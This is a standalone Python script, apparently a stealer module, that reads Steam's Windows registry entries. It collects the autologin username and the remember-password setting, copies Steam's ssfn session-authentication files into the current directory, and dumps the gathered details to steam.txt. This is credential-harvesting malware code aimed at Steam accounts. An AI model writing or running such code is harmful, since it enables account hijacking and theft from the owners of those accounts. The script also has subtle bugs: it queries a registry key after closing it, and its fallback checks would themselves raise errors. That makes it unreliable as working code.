import os
import shutil
import winreg

def fetch_steam_info():
    try:
        steam_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Valve\\Steam")
        steam_path = winreg.QueryValueEx(steam_key, "SteamPath")[0]
        winreg.CloseKey(steam_key)

        if not os.path.exists(steam_path):
            return False

        steam_info = []

        apps_key = winreg.OpenKey(steam_key, "Apps")
        num_subkeys = winreg.QueryInfoKey(apps_key)[0]

        for i in range(num_subkeys):
            game_id = winreg.EnumKey(apps_key, i)
            app_key = winreg.OpenKey(steam_key, f"Apps\\{game_id}")

            name = winreg.QueryValueEx(app_key, "Name")[0] if winreg.QueryValueEx(app_key, "Name") else "Unknown"
            installed = "Yes" if winreg.QueryValueEx(app_key, "Installed")[0] == 1 else "No"
            running = "Yes" if winreg.QueryValueEx(app_key, "Running")[0] == 1 else "No"
            updating = "Yes" if winreg.QueryValueEx(app_key, "Updating")[0] == 1 else "No"

            steam_info.append(f"Application {name}\n\tGameID: {game_id}\n\tInstalled: {installed}\n\tRunning: {running}\n\tUpdating: {updating}\n")

        for file in os.listdir(steam_path):
            if "ssfn" in file:
                shutil.copy(os.path.join(steam_path, file), os.path.join(os.getcwd(), file))

        remember_password = "Yes" if winreg.QueryValueEx(steam_key, "RememberPassword")[0] == 1 else "No"
        steam_info.append(f"\nAutologin User: {winreg.QueryValueEx(steam_key, 'AutoLoginUser')[0]}\nRemember password: {remember_password}")

        with open("steam.txt", "w") as f:
            f.write("\n".join(steam_info))

        return True
    except Exception as ex:
        print(f"Error fetching Steam info: {ex}")
        return False

if __name__ == "__main__":
    if fetch_steam_info():
        print("Steam info fetched successfully.")
    else:
        print("Steam info could not be fetched.")
